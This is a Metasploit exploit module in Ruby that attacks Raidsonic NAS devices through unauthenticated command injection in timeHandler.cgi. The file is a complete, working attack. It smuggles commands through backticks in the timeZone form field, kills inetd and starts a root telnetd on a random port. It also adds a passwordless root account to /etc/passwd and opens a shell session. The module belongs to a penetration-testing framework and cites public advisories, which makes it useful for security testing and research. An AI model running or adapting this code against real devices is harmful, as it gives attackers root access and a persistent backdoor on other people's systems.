##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::CommandShell
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Raidsonic NAS Devices Unauthenticated Remote Command Execution',
			'Description' => %q{
				Different Raidsonic NAS devices are vulnerable to OS command injection via the web
				interface. The vulnerability exists in timeHandler.cgi, which is accessible without
				authentication. This module has been tested with the versions IB-NAS5220 and
				IB-NAS4220.
				Two target are included, first to start a telnetd service and establish a session over
				it and second to run commands via the CMD target.
			},
			'Author'      =>
				[
					'Michael Messner <devnull@s3cur1ty.de>', # Vulnerability discovery and Metasploit module
					'juan vazquez' # minor help with msf module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'OSVDB', '90221' ],
					[ 'EDB', '24499' ],
					[ 'BID', '57958' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-010' ]
				],
			'DisclosureDate' => 'Feb 04 2013',
			'Privileged'     => true,
			'Platform'       => ['linux','unix'],
			'Payload'        =>
				{
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'CMD',	#all devices
						{
						'Arch' => ARCH_CMD,
						'Platform' => 'unix'
						}
					],
					[ 'Telnet',	#all devices - default target
						{
						'Arch' => ARCH_CMD,
						'Platform' => 'unix'
						}
					],
				],
			'DefaultTarget'  => 1
			))
	end

	def exploit
		@response_pattern = "\<FORM\ NAME\=\"form\"\ METHOD\=\"POST\"\ ACTION\=\"\/cgi\/time\/time.cgi\"\ ENCTYPE\=\"multipart\/form-data"
		if target.name =~ /CMD/
			exploit_cmd
		else
			exploit_telnet
		end
	end

	def exploit_cmd
		if not (datastore['CMD'])
			fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
		end
		print_status("#{rhost}:#{rport} - Sending remote command")
		res = request(payload.encoded)

		if (!res or res.code != 200 or res.body !~ /#{@response_pattern}/)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
		end

		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")

		return
	end

	def exploit_telnet
		telnetport = rand(65535)

		vprint_status("#{rhost}:#{rport} - Telnetport: #{telnetport}")

		#first request
		cmd = "killall inetd"
		cmd = Rex::Text.uri_encode(cmd)
		vprint_status("#{rhost}:#{rport} - sending first request - killing inetd")

		res = request(cmd)
		#no server header or something that we could use to get sure the command is executed
		if (!res or res.code != 200 or res.body !~ /#{@response_pattern}/)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
		end

		#second request
		inetd_cfg = rand_text_alpha(8)
		cmd = "echo \"#{telnetport} stream tcp nowait root /usr/sbin/telnetd telnetd\" > /tmp/#{inetd_cfg}"
		cmd = Rex::Text.uri_encode(cmd)
		vprint_status("#{rhost}:#{rport} - sending second request - configure inetd")
		register_file_for_cleanup("/tmp/#{inetd_cfg}")

		res = request(cmd)
		#no server header or something that we could use to get sure the command is executed
		if (!res or res.code != 200 or res.body !~ /#{@response_pattern}/)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
		end

		#third request
		cmd = "/usr/sbin/inetd /tmp/#{inetd_cfg}"
		cmd = Rex::Text.uri_encode(cmd)
		vprint_status("#{rhost}:#{rport} - sending third request - starting inetd and telnetd")

		res = request(cmd)
		#no server header or something that we could use to get sure the command is executed
		if (!res or res.code != 200 or res.body !~ /#{@response_pattern}/)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
		end

		#fourth request
		user = rand_text_alpha(6)
		cmd = "echo \"#{user}::0:0:/:/bin/ash\" >> /etc/passwd"
		cmd = Rex::Text.uri_encode(cmd)
		vprint_status("#{rhost}:#{rport} - sending fourth request - configure user #{user}")

		res = request(cmd)
		#no server header or something that we could use to get sure the command is executed
		if (!res or res.code != 200 or res.body !~ /#{@response_pattern}/)
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
		end
		begin
			sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => telnetport.to_i })

			if sock
				print_good("#{rhost}:#{rport} - Backdoor service has been spawned, handling...")
				add_socket(sock)
			else
				fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
			end

			print_status "Attempting to start a Telnet session #{rhost}:#{telnetport}"
			auth_info = {
				:host   => rhost,
				:port   => telnetport,
				:sname => 'telnet',
				:user   => user,
				:pass	=> "",
				:source_type => "exploit",
				:active => true
			}
			report_auth_info(auth_info)
			merge_me = {
				'USERPASS_FILE' => nil,
				'USER_FILE'     => nil,
				'PASS_FILE'     => nil,
				'USERNAME'      => user,
				'PASSWORD'      => nil
			}
			sock.put(user)
			sock.put("\r\n")
			start_session(self, "TELNET (#{rhost}:#{telnetport})", merge_me, false, sock)
		rescue
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
		end
		return
	end

	def request(cmd)

		uri = '/cgi/time/timeHandler.cgi'

		begin
			res = send_request_cgi({
				'uri'    => uri,
				'method' => 'POST',
				#not working without setting encode_params to false!
				'encode_params' => false,
				'vars_post' => {
					"month" => "#{rand(12)}",
					"date" => "#{rand(30)}",
					"year" => "20#{rand(99)}",
					"hour" => "#{rand(12)}",
					"minute" => "#{rand(60)}",
					"ampm" => "PM",
					"timeZone" => "Amsterdam`#{cmd}`",
					"ntp_type" => "default",
					"ntpServer" => "none",
					"old_date" => " 1 12007",
					"old_time" => "1210",
					"old_timeZone" => "Amsterdam",
					"renew" => "0"
					}
				})
			return res
		rescue ::Rex::ConnectionError
			fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice") 
		end
	end
end
